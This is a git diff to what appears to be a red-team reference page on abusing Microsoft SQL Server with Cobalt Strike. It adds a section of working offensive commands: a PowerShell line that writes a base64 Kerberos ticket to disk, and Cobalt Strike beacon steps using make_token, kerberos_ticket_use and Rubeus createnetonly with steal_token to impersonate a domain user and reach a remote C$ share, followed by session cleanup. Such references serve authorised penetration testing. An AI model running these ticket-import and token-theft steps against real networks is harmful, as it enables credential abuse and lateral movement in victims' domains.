@@ -2,7 +2,7 @@
 title: "MSSQL Abuse with Cobalt Strike"
 description: "A practical SQL-BOF reference for SQL Server discovery, permissions, code execution, linked servers and local privilege escalation. Examples use CONTOSO, lon-db-1, lon-db-2 and rsteel."
 category: "Databases"
-tools: ["MSSQL", "Cobalt Strike"]
+tools: ["MSSQL", "Cobalt Strike", "Kerbeus BOF"]
 updated: 2026-11-10
 tags: ["mssql", "sql", "ad"]
 draft: false
@@ -437,4 +437,34 @@ RESTORATION AND CLOSURE
 [ ] sql-disableclr <SQL1> "" <SQL2>        → restore remote CLR before RPC Out
 [ ] sql-disablerpc <SQL1> <SQL2>            → restore the link's RPC Out state
 [ ] sql-checkrpc <SQL1>                     → verify the link returned to its initial state
+```
+
+## Ticket import alternatives
+
+```powershell
+[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
+```
+
+```shell
+# OPSEC Alternative
+beacon> make_token CONTOSO\rsteel FakePass
+beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel.kirbi
+beacon> run klist
+beacon> ls \\<TARGET_FQDN>\c$
+```
+
+```shell
+# Rubeus Alternative
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO /username:rsteel /password:FakePass /ticket:<BASE64_TICKET>
+beacon> steal_token <CREATED_PID>
+beacon> run klist
+beacon> ls \\<TARGET_FQDN>\c$
+```
+
+```shell
+# BOF session cleanup: run while the disposable session is selected.
+beacon> krb_purge
+beacon> rev2self
+# Rubeus createnetonly path only: terminate its disposable process.
+beacon> kill <CREATED_PID>
 ```
